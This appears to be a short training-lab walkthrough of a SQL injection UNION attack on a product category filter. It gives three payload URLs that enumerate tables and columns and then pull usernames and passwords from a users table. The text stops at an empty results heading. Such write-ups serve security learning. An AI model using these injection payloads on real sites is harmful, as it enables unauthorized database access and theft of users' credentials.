 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
Hint

You can find some useful payloads on our SQL injection cheat sheet.

After determine the columns of the table and the data types in each columns

Use payload1 to determine the name of tables in the database:
payload1:   https://0af200c00467bbaac0b6726600df00a1.web-security-academy.net/filter?category=Gifts'+union+select+null,table_name+from+information_schema.tables--

After determine the name of the table holds information about the users is users we use payload2 to determine the name of columns in that table:
payload2:   https://0af200c00467bbaac0b6726600df00a1.web-security-academy.net/filter?category=Gifts'+union+select+null,column_name+from+information_schema.columns+where+table_name%3d'users'--

So, there are two columns in the table are username and password.

The last step is use union select to retrieve username and password form table users:
payload3:   https://0af200c00467bbaac0b6726600df00a1.web-security-academy.net/filter?category=Gifts'+union+select+null,username||'~'||password+from+users--

And then we have the information about the users include administrator
username        password
